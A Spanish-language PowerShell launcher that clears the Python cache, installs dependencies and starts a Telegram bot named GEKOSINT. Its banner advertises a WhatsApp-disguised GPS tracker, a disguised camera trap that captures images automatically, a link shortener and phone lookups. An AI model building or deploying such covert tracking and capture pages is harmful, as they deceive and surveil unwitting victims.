# Script PowerShell para limpiar completamente el cache y reiniciar el bot

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   REINICIO COMPLETO - GEKOSINT v4.0" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Paso 1: Detener procesos Python
Write-Host "[1/4] Deteniendo procesos Python..." -ForegroundColor Yellow
Get-Process python -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
Write-Host "✓ Procesos detenidos" -ForegroundColor Green

# Paso 2: Limpiar cache de Python recursivamente
Write-Host "[2/4] Limpiando cache de Python..." -ForegroundColor Yellow
Get-ChildItem -Path . -Include __pycache__ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path . -Filter "*.pyc" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Write-Host "✓ Cache limpiado" -ForegroundColor Green

# Paso 3: Verificar dependencias
Write-Host "[3/4] Verificando dependencias..." -ForegroundColor Yellow
python -c "import requests, phonenumbers" 2>&1 | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Host "✓ Dependencias OK" -ForegroundColor Green
} else {
    Write-Host "⚠ Instalando dependencias faltantes..." -ForegroundColor Yellow
    pip install requests phonenumbers -q
}

# Paso 4: Iniciar bot
Write-Host "[4/4] Iniciando bot..." -ForegroundColor Yellow
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host " Bot iniciado con TODAS las mejoras:" -ForegroundColor Green
Write-Host " ✓ Phone Intel - Info extensa + ubicación (CORREGIDO)" -ForegroundColor Green
Write-Host " ✓ Geo Tracker - Camuflaje WhatsApp + GPS auto" -ForegroundColor Green
Write-Host " ✓ Camera Trap - Camuflaje + Captura auto" -ForegroundColor Green
Write-Host " ✓ Acortador - is.gd sin warnings" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "PRUEBA PHONE INTEL:" -ForegroundColor Cyan
Write-Host "  En Telegram envía: +525555555555" -ForegroundColor White
Write-Host "  Debes ver secciones de UBICACIÓN y VALIDACIÓN" -ForegroundColor White
Write-Host ""
Write-Host "PRUEBA GEO TRACKER:" -ForegroundColor Cyan
Write-Host "  Genera un enlace nuevo desde el bot" -ForegroundColor White
Write-Host "  O abre: pages\test_whatsapp.html en tu navegador" -ForegroundColor White
Write-Host ""
Write-Host "Presiona Ctrl+C para detener" -ForegroundColor Yellow
Write-Host ""

# Lanzar el bot
python bot.py
